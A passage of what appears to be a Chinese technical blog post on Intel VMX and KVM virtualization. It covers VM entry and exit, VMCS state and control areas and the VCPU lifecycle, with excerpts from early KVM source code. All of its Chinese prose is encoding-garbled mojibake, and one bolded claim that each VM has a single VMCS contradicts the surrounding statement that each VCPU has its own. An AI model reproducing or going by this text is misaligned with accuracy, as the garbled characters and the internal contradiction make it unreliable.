Modeçš„VMMå¯ä»¥é€šè¿‡æ‰§è¡ŒCPUæä¾›çš„è™šæ‹ŸåŒ–æŒ‡ä»¤<strong>VMLaunchåˆ‡æ¢åˆ°VMX non-Root Mode</strong>ï¼Œå› ä¸ºè¿™ä¸ªè¿‡ç¨‹ç›¸å½“äº<strong>è¿›å…¥Guest</strong>ï¼Œæ‰€ä»¥é€šå¸¸ä¹Ÿè¢«ç§°ä¸º<strong>VM entry</strong><br>VM exit</li><li>å½“Guestå†…éƒ¨æ‰§è¡Œäº†æ•æ„ŸæŒ‡ä»¤ï¼Œæ¯”å¦‚æŸäº›I/Oæ“ä½œåï¼Œå°†è§¦å‘CPUå‘ç”Ÿé™·å…¥çš„åŠ¨ä½œï¼Œä»VMX non-Root Modeåˆ‡æ¢å›VMX Root Modeï¼Œè¿™ä¸ªè¿‡ç¨‹ç›¸å½“äºé€€å‡ºVMï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸ºVM exit</li><li>ç„¶åVMMå°†å¯¹Guestçš„æ“ä½œè¿›è¡Œæ¨¡æ‹Ÿ</li></ul><p>æ”¯æŒVMXçš„CPUæœ‰ä»¥ä¸‹3ç‚¹ä¸åŒï¼š</p><p>1ï¼‰è¿è¡ŒäºGuestæ¨¡å¼æ—¶ï¼Œ<strong>Guestç”¨æˆ·ç©ºé—´çš„ç³»ç»Ÿè°ƒç”¨ç›´æ¥é™·å…¥Guestæ¨¡å¼çš„å†…æ ¸ç©ºé—´</strong>ï¼Œè€Œ<strong>ä¸å†æ˜¯é™·å…¥Hostæ¨¡å¼çš„å†…æ ¸ç©ºé—´</strong>ã€‚</p><blockquote><p>ç³»ç»Ÿè°ƒç”¨å¤„ç†ï¼šåœ¨VMXæ”¯æŒçš„è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œå½“Guestè¿è¡Œç”¨æˆ·ç©ºé—´ç¨‹åºå¹¶è¿›è¡Œç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œç³»ç»Ÿè°ƒç”¨ä¸å†ç›´æ¥é™·å…¥Hostæ¨¡å¼çš„å†…æ ¸ç©ºé—´ï¼Œè€Œæ˜¯é™·å…¥Guestæ¨¡å¼çš„å†…æ ¸ç©ºé—´ã€‚è¿™æ ·ï¼Œ<strong>Guestå†…æ ¸å¯ä»¥ç›´æ¥å¤„ç†ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ— éœ€VMMï¼ˆè™šæ‹Ÿæœºç›‘æ§å™¨ï¼‰ä»‹å…¥</strong>ï¼Œä»è€Œæé«˜äº†æ€§èƒ½</p></blockquote><p>2ï¼‰å¯¹äºå¤–éƒ¨ä¸­æ–­ï¼Œå› ä¸ºéœ€è¦ç”±VMMæ§åˆ¶ç³»ç»Ÿçš„èµ„æºï¼Œæ‰€ä»¥å¤„äºGuestæ¨¡å¼çš„CPUæ”¶åˆ°å¤–éƒ¨ä¸­æ–­åï¼Œè§¦å‘CPUä»Guestæ¨¡å¼é€€å‡ºåˆ°Hostæ¨¡å¼ï¼Œ<strong>ç”±Hostå†…æ ¸å¤„ç†å¤–éƒ¨ä¸­æ–­ã€‚å¤„ç†å®Œä¸­æ–­åï¼Œå†é‡æ–°åˆ‡å…¥Guestæ¨¡å¼</strong>ã€‚ä¸ºäº†æé«˜I/Oæ•ˆç‡ï¼ŒIntelæ”¯æŒå¤–è®¾<strong>é€ä¼ æ¨¡å¼</strong>ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼ŒGuest<strong>ä¸å¿…äº§ç”ŸVM exit</strong>ã€‚åœ¨â€œè®¾å¤‡è™šæ‹ŸåŒ–â€ä¸€ç« å°†è®¨è®ºè¿™ç§ç‰¹æ®Šæ–¹å¼ã€‚</p><p>3ï¼‰ä¸å†æ˜¯æ‰€æœ‰çš„ç‰¹æƒæŒ‡ä»¤éƒ½ä¼šå¯¼è‡´å¤„äºGuestæ¨¡å¼çš„CPUå‘ç”ŸVM exitã€‚<strong>ä»…å½“è¿è¡Œæ•æ„ŸæŒ‡ä»¤æ—¶æ‰ä¼šå¯¼è‡´CPUä»Guestæ¨¡å¼é™·å…¥Hostæ¨¡å¼</strong>ï¼Œå› ä¸ºæœ‰çš„ç‰¹æƒæŒ‡ä»¤å¹¶ä¸éœ€è¦ç”±VMMä»‹å…¥å¤„ç†ã€‚</p><blockquote><p><strong>å¯¹äºä¸€äº›æ— éœ€VMMä»‹å…¥çš„ç‰¹æƒæŒ‡ä»¤ï¼ŒCPUå¯ä»¥åœ¨Guestæ¨¡å¼ä¸‹ç›´æ¥æ‰§è¡Œï¼Œä»è€Œæé«˜è™šæ‹Ÿæœºçš„æ€§èƒ½ã€‚</strong></p></blockquote><p>VMXï¼ˆVirtual Machine Extensionsï¼‰æ˜¯Intelå¤„ç†å™¨çš„è™šæ‹ŸåŒ–æ‰©å±•æŠ€æœ¯ï¼Œå®ƒå¼•å…¥äº†VMCSï¼ˆVirtual Machine Control Structureï¼‰è¿™ä¸€æ•°æ®ç»“æ„ã€‚<strong>VMCSç”¨äºä¿å­˜è™šæ‹Ÿæœºçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œæ¯ä¸ªGuestè™šæ‹Ÿæœºéƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„VMCSå®ä¾‹ã€‚</strong></p><p>VMCSè®°å½•äº†è™šæ‹Ÿæœºçš„çŠ¶æ€å’Œé…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬è™šæ‹Ÿå¤„ç†å™¨çš„å¯„å­˜å™¨å€¼ã€æ§åˆ¶å¯„å­˜å™¨è®¾ç½®ã€è™šæ‹Ÿæœºæ‰§è¡Œçš„çŠ¶æ€ã€ä¸­æ–­å¤„ç†ã€VM exitå’ŒVM entryçš„è®¾ç½®ç­‰ã€‚VMCSåœ¨è™šæ‹ŸåŒ–è¿‡ç¨‹ä¸­æ‰®æ¼”ç€é‡è¦çš„è§’è‰²ï¼Œç”¨äºæ§åˆ¶è™šæ‹Ÿæœºçš„<strong>è¿è¡Œ</strong>ã€å®ç°è™šæ‹Ÿæœºçš„<strong>åˆ‡æ¢</strong>ã€ä»¥åŠåœ¨VM exitå’ŒVM entryæ—¶<strong>ä¿å­˜å’Œæ¢å¤è™šæ‹Ÿæœºçš„çŠ¶æ€</strong>ã€‚</p><p>æ¯ä¸ªGuestè™šæ‹Ÿæœºéƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„VMCSï¼Œè¿™äº›VMCSå®ä¾‹æ˜¯ç‹¬ç«‹çš„ï¼Œå½¼æ­¤ä¹‹é—´éš”ç¦»ã€‚å½“VMMï¼ˆè™šæ‹Ÿæœºç›‘æ§å™¨ï¼‰åœ¨å®¿ä¸»æœºä¸Šè¿è¡Œå¤šä¸ªè™šæ‹Ÿæœºæ—¶ï¼Œæ¯ä¸ªè™šæ‹Ÿæœºçš„VMCSä¼šåœ¨VMMçš„ç®¡ç†ä¸‹è¿›è¡Œåˆ›å»ºå’Œç»´æŠ¤ã€‚VMCSçš„ç®¡ç†æ¶‰åŠVM entryå’ŒVM exitçš„æ“ä½œï¼Œç”¨äºå®ç°Guestå’Œå®¿ä¸»æœºä¹‹é—´çš„è½¬æ¢å’Œåˆ‡æ¢ã€‚</p><p><strong>æ³¨æ„ï¼šæ¯ä¸ªè™šæ‹Ÿæœºéƒ½ä¼šæœ‰ä¸€ä¸ªå”¯ä¸€çš„ VMCSï¼Œä½†æ˜¯æ¯ä¸ªè™šæ‹Ÿæœºå¯ä»¥æœ‰ä¸€ä¸ªæˆ–å¤šä¸ª vCPU</strong></p><blockquote><p>åœ¨KVMï¼ˆKernel-based Virtual Machineï¼‰æ¨¡å—ä¸­ï¼Œå¯¹äºæ¯ä¸ªè™šæ‹ŸCPUï¼ˆVCPUï¼‰ï¼Œä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªVMCSï¼ˆVirtual Machine Control Structureï¼‰å®ä¾‹ã€‚VMCSç”¨äºä¿å­˜è™šæ‹Ÿæœºçš„çŠ¶æ€ä¿¡æ¯å’Œæ§åˆ¶è™šæ‹Ÿæœºçš„è¡Œä¸ºã€‚æ¯ä¸ªVCPUéƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„VMCSï¼Œè¿™æ ·å¯ä»¥å®ç°å¯¹ä¸åŒè™šæ‹Ÿæœºçš„éš”ç¦»å’Œç®¡ç†ã€‚</p></blockquote><p><img src="https://img.gls.show/img/Pasted%20image%2020230801202743.png"><br>VMCSä¸­ä¸»è¦ä¿å­˜ç€ä¸¤å¤§ç±»æ•°æ®:</p><ul><li>çŠ¶æ€ï¼ˆHostçš„çŠ¶æ€å’ŒGuestçš„çŠ¶æ€ï¼‰</li><li>è¡Œä¸ºï¼ˆæ§åˆ¶Guestè¿è¡Œæ—¶çš„è¡Œä¸ºï¼‰</li></ul><p>ä¸€äº›æ•°æ®ï¼š</p><p>1ï¼‰<strong>Guest-state</strong> areaï¼ˆå®¢æˆ·æœºçŠ¶æ€åŒºåŸŸï¼‰ï¼šè¯¥åŒºåŸŸä¿å­˜ç€è™šæ‹Ÿæœºï¼ˆGuestï¼‰çš„çŠ¶æ€ä¿¡æ¯ã€‚å½“è™šæ‹Ÿæœºå‘ç”ŸVM exitæ—¶ï¼ŒGuestçš„çŠ¶æ€ä¼šè‡ªåŠ¨ä¿å­˜åˆ°è¿™ä¸ªåŒºåŸŸã€‚å½“è™šæ‹Ÿæœºå†æ¬¡è¿›å…¥ï¼ˆVM entryï¼‰æ—¶ï¼Œè¿™äº›ä¿å­˜çš„çŠ¶æ€ä¼šè¢«è‡ªåŠ¨è£…è½½åˆ°CPUä¸­ï¼Œä½¿å¾—è™šæ‹Ÿæœºèƒ½å¤Ÿä»ç¦»å¼€çŠ¶æ€ç»§ç»­æ‰§è¡Œï¼Œè¿™æ˜¯ç¡¬ä»¶å±‚é¢çš„è‡ªåŠ¨è¡Œä¸ºï¼Œæ— éœ€VMMç¼–ç å¹²é¢„ã€‚</p><p>2ï¼‰<strong>Host-state</strong> areaï¼ˆå®¿ä¸»æœºçŠ¶æ€åŒºåŸŸï¼‰ï¼šè¯¥åŒºåŸŸä¿å­˜ç€å®¿ä¸»æœºï¼ˆHostï¼‰çš„çŠ¶æ€ä¿¡æ¯ã€‚å½“è™šæ‹Ÿæœºå‘ç”ŸVM entryæ—¶ï¼ŒCPUä¼šè‡ªåŠ¨å°†å®¿ä¸»æœºçŠ¶æ€ä¿å­˜åˆ°è¿™ä¸ªåŒºåŸŸã€‚è€Œå½“è™šæ‹Ÿæœºå‘ç”ŸVM exitæ—¶ï¼ŒCPUä¼šè‡ªåŠ¨ä»VMCSä¸­æ¢å¤å®¿ä¸»æœºçŠ¶æ€åˆ°ç‰©ç†CPUï¼Œä½¿å¾—è™šæ‹Ÿæœºé€€å‡ºåå®¿ä¸»æœºèƒ½å¤Ÿç»§ç»­æ‰§è¡Œã€‚</p><p>3ï¼‰VM-<strong>exit information</strong> fieldsï¼ˆè™šæ‹Ÿæœºé€€å‡ºä¿¡æ¯åŒºåŸŸï¼‰ï¼šåœ¨è™šæ‹Ÿæœºå‘ç”ŸVM exitæ—¶ï¼ŒVMMéœ€è¦çŸ¥é“å¯¼è‡´VM exitçš„åŸå› ï¼Œä»¥ä¾¿æ ¹æ®å…·ä½“æƒ…å†µè¿›è¡Œç›¸åº”çš„å¤„ç†ã€‚ä¸ºæ­¤ï¼ŒCPUä¼šè‡ªåŠ¨å°†å¯¼è‡´VM exitçš„åŸå› å’Œä¸€äº›ç›¸å…³ä¿¡æ¯ä¿å­˜åœ¨è¿™ä¸ªåŒºåŸŸä¸­ï¼Œä¾›VMMä½¿ç”¨ã€‚</p><p>4ï¼‰VM-<strong>execution control</strong> fieldsï¼ˆè™šæ‹Ÿæœºæ‰§è¡Œæ§åˆ¶åŒºåŸŸï¼‰ï¼šè¯¥åŒºåŸŸä¸­çš„å„ç§å­—æ®µç”¨äº<strong>æ§åˆ¶è™šæ‹Ÿæœºè¿è¡Œæ—¶çš„è¡Œä¸º</strong>ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥è®¾ç½®æ˜¯å¦åœ¨Guestè®¿é—®CR3å¯„å­˜å™¨æ—¶è§¦å‘VM exitã€‚VM-entry control fieldså’ŒVM-exit control fieldsä¹ŸåŒ…å«åœ¨è¿™ä¸ªåŒºåŸŸä¸­ï¼Œå®ƒä»¬ç”¨äºæ§åˆ¶è™šæ‹Ÿæœºè¿›å…¥ï¼ˆVM entryï¼‰å’Œé€€å‡ºï¼ˆVM exitï¼‰æ—¶çš„è¡Œä¸ºã€‚</p><blockquote><p>åœ¨æ¯æ¬¡å‡†å¤‡å°†ç‰©ç†CPU<strong>åˆ‡æ¢</strong>åˆ°è™šæ‹Ÿæœºçš„Guestæ¨¡å¼ï¼ˆVM entryï¼‰æ—¶ï¼ŒKVMä¼š<strong>è®¾ç½®ç‰©ç†CPUçš„VMCSæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘å³å°†åˆ‡æ¢åˆ°çš„Guestè™šæ‹Ÿæœºå¯¹åº”çš„VMCSå®ä¾‹</strong>ã€‚è¿™æ ·ï¼Œå½“ç‰©ç†CPUè¿›å…¥Guestæ¨¡å¼åï¼Œå®ƒä¼šè‡ªåŠ¨ä½¿ç”¨è¯¥VMCSä¸­ä¿å­˜çš„è™šæ‹ŸæœºçŠ¶æ€ä¿¡æ¯ï¼Œå¹¶æŒ‰ç…§VMCSä¸­çš„é…ç½®æ‰§è¡Œè™šæ‹Ÿæœºçš„è¡Œä¸ºã€‚</p></blockquote><blockquote><p>é€šè¿‡æ¯ä¸ªVCPUæ‹¥æœ‰è‡ªå·±çš„ç‹¬ç«‹VMCSå®ä¾‹ï¼Œå¹¶åœ¨åˆ‡æ¢åˆ°Guestæ¨¡å¼æ—¶è®¾ç½®æ­£ç¡®çš„VMCSæŒ‡é’ˆï¼ŒKVMèƒ½å¤Ÿé«˜æ•ˆåœ°ç®¡ç†å¤šä¸ªè™šæ‹Ÿæœºï¼Œå¹¶ç¡®ä¿è™šæ‹Ÿæœºä¹‹é—´çš„éš”ç¦»å’Œèµ„æºç®¡ç†ã€‚</p></blockquote><p>åœ¨åˆ›å»ºVCPUæ—¶ï¼ŒKVMæ¨¡å—å°†<strong>ä¸ºæ¯ä¸ªVCPUç”³è¯·ä¸€ä¸ªVMCS</strong>ï¼Œæ¯æ¬¡CPUå‡†å¤‡åˆ‡å…¥Guestæ¨¡å¼æ—¶ï¼Œå°†è®¾ç½®å…¶VMCSæŒ‡é’ˆ<strong>æŒ‡å‘</strong>å³å°†åˆ‡å…¥çš„<strong>Guestå¯¹åº”çš„VMCSå®ä¾‹</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">6</span>aa8b732ca01c3d7a54e93f4d701b8aabbe60fb7<br>[PATCH] kvm: userspace interface<br>linux.git/drivers/kvm/vmx.c<br><br><span class="hljs-comment">// å®šä¹‰vmx_vcpu_loadå‡½æ•°ï¼Œç”¨äºåŠ è½½è™šæ‹ŸCPUçš„VMCS</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct kvm_vcpu *<span class="hljs-title">vmx_vcpu_load</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// å°†vcpu-&gt;vmcsçš„è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œå¹¶å­˜å‚¨åœ¨phys_addrå˜é‡ä¸­</span><br>    u64 phys_addr = __pa(vcpu-&gt;vmcs);<br>    <span class="hljs-keyword">int</span> cpu;<br>    <br>    <span class="hljs-comment">// è·å–å½“å‰CPUçš„ç¼–å·</span><br>    cpu = get_cpu();<br>    <br>    <span class="hljs-comment">// ... å…¶ä»–ä»£ç  ...</span><br>    <br>    <span class="hljs-comment">// æ£€æŸ¥å½“å‰æ´»åŠ¨çš„VMCSæ˜¯å¦ä¸å°†è¦åŠ è½½çš„vcpu-&gt;vmcsç›¸åŒ</span><br>    <span class="hljs-keyword">if</span> (per_cpu(current_vmcs, cpu) != vcpu-&gt;vmcs) &#123;<br>        <span class="hljs-comment">// è®¾ç½®å½“å‰æ´»åŠ¨çš„VMCSä¸ºvcpu-&gt;vmcsï¼Œè¡¨ç¤ºæ­£åœ¨åŠ è½½è¯¥VMCS</span><br>        per_cpu(current_vmcs, cpu) = vcpu-&gt;vmcs;<br>        <br>        <span class="hljs-comment">// æ‰§è¡ŒVMCSçš„åŠ è½½æ“ä½œï¼ˆVMPTRLDï¼‰ï¼Œå°†vcpu-&gt;vmcsæŒ‡å‘çš„VMCSåŠ è½½åˆ°CPUä¸­</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        è¿™æ˜¯ä¸€ä¸ªå†…è”æ±‡ç¼–ä»£ç ï¼Œç”¨äºæ‰§è¡ŒVMCSçš„åŠ è½½æ“ä½œï¼ˆVMPTRLDï¼‰ã€‚`ASM_VMX_VMPTRLD_RAX`æ˜¯ä¸€ä¸ªå®ï¼Œå±•å¼€åæ˜¯VMXæŒ‡ä»¤`VMPTRLD`ï¼Œç”¨äºåŠ è½½VMCSã€‚`&quot;=g&quot;(error)`è¡¨ç¤ºå°†é”™è¯¯ç ä¿å­˜åœ¨`error`å˜é‡ä¸­ï¼Œ`&quot;a&quot;(&amp;phys_addr)`è¡¨ç¤ºå°†`phys_addr`çš„åœ°å€ä¼ é€’ç»™å¯„å­˜å™¨RAXï¼Œ`&quot;m&quot;(phys_addr)`è¡¨ç¤ºå°†`phys_addr`ä½œä¸ºå†…å­˜æ“ä½œæ•°ï¼Œ`&quot;cc&quot;`è¡¨ç¤ºè¯¥å†…è”æ±‡ç¼–ä»£ç å¯èƒ½å½±å“æ ‡å¿—å¯„å­˜å™¨ã€‚</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(ASM_VMX_VMPTRLD_RAX <span class="hljs-string">&quot;; setna %0&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">                      : <span class="hljs-string">&quot;=g&quot;</span>(error) : <span class="hljs-string">&quot;a&quot;</span>(&amp;phys_addr), <span class="hljs-string">&quot;m&quot;</span>(phys_addr)</span></span><br><span class="hljs-params"><span class="hljs-function">                      : <span class="hljs-string">&quot;cc&quot;</span>)</span></span>;<br>        <br>        <span class="hljs-comment">// ... å…¶ä»–ä»£ç  ...</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// ... å…¶ä»–ä»£ç  ...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>ä»£ç ä¸­çš„<code>vmx_vcpu_load</code>å‡½æ•°ç”¨äºåŠ è½½è™šæ‹ŸCPUçš„VMCSï¼ˆè™šæ‹Ÿæœºæ§åˆ¶ç»“æ„ï¼‰ã€‚</li><li><code>phys_addr</code>å˜é‡å­˜å‚¨äº†<code>vcpu-&gt;vmcs</code>çš„è™šæ‹Ÿåœ°å€è½¬æ¢åçš„ç‰©ç†åœ°å€ã€‚</li><li><code>get_cpu()</code>å‡½æ•°ç”¨äºè·å–å½“å‰CPUçš„ç¼–å·ã€‚</li><li><code>per_cpu(current_vmcs, cpu)</code>æ˜¯æŒ‡å‘å½“å‰CPUä¸Šæ´»åŠ¨çš„VMCSçš„æŒ‡é’ˆï¼Œæ£€æŸ¥å½“å‰æ´»åŠ¨çš„VMCSæ˜¯å¦ä¸å³å°†åŠ è½½çš„<code>vcpu-&gt;vmcs</code>ç›¸åŒã€‚</li><li>å¦‚æœå½“å‰æ´»åŠ¨çš„VMCSä¸å°†è¦åŠ è½½çš„<code>vcpu-&gt;vmcs</code>ä¸åŒï¼Œé‚£ä¹ˆå°†è®¾ç½®å½“å‰æ´»åŠ¨çš„VMCSä¸º<code>vcpu-&gt;vmcs</code>ï¼Œè¡¨ç¤ºæ­£åœ¨åŠ è½½è¯¥VMCSã€‚</li><li><code>asm volatile (ASM_VMX_VMPTRLD_RAX &quot;; setna %0&quot; ...)</code>æ˜¯ä¸€ä¸ªå†…è”æ±‡ç¼–ä»£ç ï¼Œæ‰§è¡ŒVMCSçš„åŠ è½½æ“ä½œï¼ˆVMPTRLDï¼‰ï¼Œå°†<code>vcpu-&gt;vmcs</code>æŒ‡å‘çš„VMCSåŠ è½½åˆ°CPUä¸­ã€‚</li></ol><blockquote><p><code>per_cpu</code>æ˜¯Linuxå†…æ ¸ä¸­ç”¨äºè®¿é—®ç‰¹å®šCPUæœ¬åœ°æ•°æ®çš„å®ã€‚å®ƒæ˜¯Linuxå†…æ ¸ä¸­ç”¨äºå¤šå¤„ç†å™¨ï¼ˆMultiprocessorï¼Œç®€ç§°MPï¼‰å’Œå¤šæ ¸ï¼ˆMulticoreï¼‰ç³»ç»Ÿçš„ä¸€ç§æœºåˆ¶ã€‚<br> åœ¨å¤šå¤„ç†å™¨ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªCPUæ‹¥æœ‰è‡ªå·±çš„æœ¬åœ°æ•°æ®ï¼Œä¾‹å¦‚çº¿ç¨‹ç§æœ‰æ•°æ®æˆ–æœ¬åœ°ç¼“å­˜ã€‚ç”±äºå¤šä¸ªCPUä¹‹é—´å…±äº«å†…å­˜ï¼Œç›´æ¥è®¿é—®è¿™äº›æœ¬åœ°æ•°æ®å¯èƒ½ä¼šå¯¼è‡´æ•°æ®çš„ä¸ä¸€è‡´æ€§ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒLinuxå†…æ ¸æä¾›äº†<code>per_cpu</code>å®ï¼Œå®ƒå…è®¸å¼€å‘è€…å£°æ˜å’Œä½¿ç”¨CPUæœ¬åœ°çš„å˜é‡ï¼Œå¹¶æ ¹æ®å½“å‰CPUçš„ç¼–å·æ¥è®¿é—®è¿™äº›å˜é‡çš„æ­£ç¡®å®ä¾‹ã€‚<br> <code>per_cpu</code>å®ä½¿ç”¨ç‰¹æ®Šçš„è¯­æ³•ï¼Œä¾‹å¦‚<code>per_cpu(var, cpu)</code>ï¼Œå…¶ä¸­<code>var</code>æ˜¯è¦è®¿é—®çš„å˜é‡ï¼Œ<code>cpu</code>æ˜¯æŒ‡å®šçš„CPUç¼–å·ã€‚è¯¥å®ä¼šæ ¹æ®å½“å‰CPUçš„ç¼–å·è‡ªåŠ¨é€‰æ‹©æ­£ç¡®çš„å®ä¾‹ï¼Œä»è€Œç¡®ä¿æ¯ä¸ªCPUéƒ½è®¿é—®è‡ªå·±æœ¬åœ°çš„å˜é‡ã€‚</p></blockquote><h3 id="1-1-4-VCPUç”Ÿå‘½å‘¨æœŸ"><a href="#1-1-4-VCPUç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="1.1.4 VCPUç”Ÿå‘½å‘¨æœŸ"></a>1.1.4 VCPUç”Ÿå‘½å‘¨æœŸ</h3><p>å¯¹äºæ¯ä¸ªè™šæ‹Ÿå¤„ç†å™¨ï¼ˆVCPUï¼‰ï¼Œ<strong>VMMä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹æ¥ä»£è¡¨VCPUè¿™ä¸ªå®ä½“</strong></p><p>åœ¨Guestè¿è½¬è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ªVCPUåŸºæœ¬éƒ½åœ¨ä¸‹å›¾æ‰€ç¤ºçš„çŠ¶æ€ä¸­ä¸æ–­åœ°è½¬æ¢ï¼šï¼ˆVCPUç”Ÿå‘½å‘¨æœŸï¼‰</p><p><img src="https://img.gls.show/img/Pasted%20image%2020230801221309.png"></p><ol><li>VCPUå‡†å¤‡ï¼šåœ¨ç”¨æˆ·ç©ºé—´å‡†å¤‡å¥½åï¼Œ<strong>VCPUæ‰€åœ¨çº¿ç¨‹å‘å†…æ ¸ä¸­çš„KVMæ¨¡å—å‘èµ·ioctlè¯·æ±‚KVM_RUN</strong>ï¼Œé€šçŸ¥å†…æ ¸å¯ä»¥åˆ‡å…¥Guestæ¨¡å¼è¿è¡ŒGuestã€‚</li><li>åˆ‡å…¥Guestæ¨¡å¼ï¼šè¿›å…¥å†…æ ¸æ€åï¼ŒKVMæ¨¡å—<strong>ä½¿ç”¨è™šæ‹ŸåŒ–æŒ‡ä»¤åˆ‡å…¥Guestæ¨¡å¼</strong>ã€‚<strong>é¦–æ¬¡</strong>è¿è¡ŒGuestä½¿ç”¨<strong>VMLaunch</strong>æŒ‡ä»¤ï¼Œå¦åˆ™ä½¿ç”¨<strong>VMResume</strong>æŒ‡ä»¤ã€‚<ol><li>åœ¨åˆ‡æ¢è¿‡ç¨‹ä¸­ï¼ŒCPUçš„çŠ¶æ€ï¼ˆ<strong>Hostçš„çŠ¶æ€</strong>ï¼‰ä¿å­˜åˆ°VMCSä¸­çš„HostçŠ¶æ€åŒºåŸŸï¼ŒéCPUè‡ªåŠ¨ä¿å­˜çš„çŠ¶æ€ç”±KVMè´Ÿè´£ä¿å­˜</li><li>ç„¶åï¼ŒåŠ è½½å­˜å‚¨åœ¨VMCSä¸­çš„Guestçš„çŠ¶æ€åˆ°ç‰©ç†CPUï¼ŒéCPUè‡ªåŠ¨æ¢å¤çš„çŠ¶æ€ç”±KVMè´Ÿè´£æ¢å¤ã€‚</li></ol></li><li>è¿è¡ŒGuestæŒ‡ä»¤ï¼šç‰©ç†CPUè¿è¡ŒGuestæŒ‡ä»¤ã€‚<strong>å½“æ‰§è¡ŒGuestæŒ‡ä»¤é‡åˆ°æ•æ„ŸæŒ‡ä»¤æ—¶ï¼ŒCPUå°†ä»Guestæ¨¡å¼åˆ‡å›åˆ°Hostæ¨¡å¼çš„ring 0ï¼Œè¿›å…¥Hostå†…æ ¸çš„KVMæ¨¡å—</strong>ã€‚åœ¨åˆ‡æ¢è¿‡ç¨‹ä¸­ï¼ŒCPUçš„çŠ¶æ€ï¼ˆGuestçš„çŠ¶æ€ï¼‰ä¿å­˜åˆ°VMCSä¸­çš„GuestçŠ¶æ€åŒºåŸŸï¼Œç„¶ååŠ è½½å­˜å‚¨åœ¨VMCSä¸­çš„Hostçš„çŠ¶æ€åˆ°ç‰©ç†CPUã€‚éCPUè‡ªåŠ¨ä¿å­˜çš„çŠ¶æ€ç”±KVMæ¨¡å—è´Ÿè´£ä¿å­˜ã€‚</li><li>å¤„ç†è™šæ‹Ÿæœºé€€å‡ºï¼šKVMæ¨¡å—ä»VMCSä¸­è¯»å–è™šæ‹Ÿæœºé€€å‡ºåŸå› ï¼Œå°è¯•åœ¨å†…æ ¸ä¸­å¤„ç†ã€‚å¦‚æœå†…æ ¸å¯ä»¥å¤„ç†ï¼Œå°±ä¸å¿…å†åˆ‡æ¢åˆ°Hostæ¨¡å¼çš„ç”¨æˆ·æ€äº†ï¼Œç›´æ¥å¿«é€Ÿåˆ‡å›Guestã€‚è¿™ç§é€€å‡ºä¹Ÿç§°ä¸ºè½»é‡çº§è™šæ‹Ÿæœºé€€å‡ºã€‚</li><li>å¤„ç†è™šæ‹Ÿæœºé€€å‡ºçš„å¤æ‚æƒ…å†µï¼šå¦‚æœKVMæ¨¡å—ä¸èƒ½å¤„ç†è™šæ‹Ÿæœºé€€å‡ºï¼ŒVCPUå°†å†æ¬¡è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œä»Hostçš„å†…æ ¸æ€åˆ‡æ¢åˆ°Hostçš„ç”¨æˆ·æ€ï¼Œç”±VMMçš„ç”¨æˆ·ç©ºé—´éƒ¨åˆ†è¿›è¡Œå¤„ç†ã€‚VMMç”¨æˆ·ç©ºé—´å¤„ç†å®Œæ¯•åï¼Œå†æ¬¡å‘èµ·åˆ‡å…¥Guestæ¨¡å¼çš„æŒ‡ä»¤ã€‚</li></ol><p>åœ¨æ•´ä¸ªè™šæ‹Ÿæœºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ­¥éª¤1ï½5å¾ªç¯å¾€å¤ã€‚</p><p>ä¸‹é¢æ˜¯KVMåˆ‡å…¥ã€åˆ‡å‡ºGuestçš„ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// commit 